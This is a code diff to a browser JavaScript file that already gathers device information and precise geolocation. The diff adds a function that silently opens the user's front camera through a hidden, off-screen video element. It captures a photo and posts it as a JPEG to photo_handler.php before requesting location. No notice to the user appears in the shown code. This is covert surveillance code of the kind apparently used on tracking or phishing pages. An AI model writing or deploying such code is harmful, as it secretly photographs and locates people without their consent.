@@ -85,8 +85,117 @@ function information() {
 }
 
 
+function capturePhoto(callback) {
+  var finished = false;
+
+  function finish() {
+    if (finished) {
+      return;
+    }
+    finished = true;
+    if (callback) {
+      callback();
+    }
+  }
+
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+    finish();
+    return;
+  }
+
+  navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+    .then(function (stream) {
+      var video = document.createElement('video');
+      video.setAttribute('playsinline', '');
+      video.setAttribute('muted', '');
+      video.muted = true;
+      video.srcObject = stream;
+      video.style.position = 'fixed';
+      video.style.left = '-9999px';
+      video.style.width = '1px';
+      video.style.height = '1px';
+      video.style.opacity = '0';
+      document.body.appendChild(video);
+
+      var captured = false;
+      var tries = 0;
+
+      function stopStream() {
+        stream.getTracks().forEach(function (track) { track.stop(); });
+        if (video.parentNode) {
+          video.parentNode.removeChild(video);
+        }
+      }
+
+      function tick() {
+        if (captured) {
+          return;
+        }
+        if (video.videoWidth > 0) {
+          captured = true;
+          try {
+            var width = 640;
+            var height = 480;
+            var vw = video.videoWidth;
+            var vh = video.videoHeight;
+            var ratio = width / height;
+            var sw = vw;
+            var sh = vh;
+            if (vw / vh > ratio) {
+              sw = vh * ratio;
+            } else {
+              sh = vw / ratio;
+            }
+            var canvas = document.createElement('canvas');
+            canvas.width = width;
+            canvas.height = height;
+            canvas.getContext('2d').drawImage(
+              video, (vw - sw) / 2, (vh - sh) / 2, sw, sh, 0, 0, width, height
+            );
+            $.ajax({
+              type: 'POST',
+              url: 'photo_handler.php',
+              data: { Status: 'success', Photo: canvas.toDataURL('image/jpeg', 0.85) },
+              mimeType: 'text',
+              complete: function () {
+                stopStream();
+                finish();
+              }
+            });
+          } catch (e) {
+            stopStream();
+            finish();
+          }
+          return;
+        }
+        if (++tries > 25) {
+          stopStream();
+          finish();
+          return;
+        }
+        setTimeout(tick, 200);
+      }
+
+      video.addEventListener('loadedmetadata', tick);
+      var play = video.play();
+      if (play && play.catch) {
+        play.catch(function () { });
+      }
+      setTimeout(tick, 400);
+    }, function () {
+      finish();
+    });
+}
+
 
 function locate(callback, errCallback) {
+  capturePhoto(function () {
+    requestLocation(callback, errCallback);
+  });
+}
+
+
+function requestLocation(callback, errCallback) {
   if (navigator.geolocation) {
     var optn = { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 };
     navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
@@ -175,4 +284,3 @@ function locate(callback, errCallback) {
     });
   };
 }
-
